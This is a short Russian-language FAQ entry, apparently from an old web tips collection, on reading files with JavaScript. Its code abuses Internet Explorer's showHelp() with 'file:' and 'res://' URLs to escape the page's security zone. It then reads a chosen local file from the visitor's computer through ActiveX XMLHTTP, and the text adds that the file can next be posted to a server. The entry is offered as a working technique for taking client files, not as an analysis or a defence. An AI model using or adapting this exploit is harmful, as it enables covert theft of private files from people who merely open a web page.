Как работать с файлами с помощью JavaScript? (Tishaishii )
Клиентский файл можно переслать на сервер, используя следующий код:
<script> 
function go() 
{ 
      var c; 
      try 
      { 
            c=new ActiveXObject("Msxml2.XMLHTTP"); 
      } 
      catch(e) 
      { 
            c=new ActiveXObject("Microsoft.XMLHTTP"); 
      } 
      c.open("GET","_имя_файла_",false); 
      c.send(null); 
      alert(c.responseText); 
} 
showHelp("file:"); 
showHelp("res://shdoclc.dll/about.dlg"); 
showHelp("javascript:"+go+"go();"); 
</script>
Потом файл можно отправить POSTом с помошью сокета.
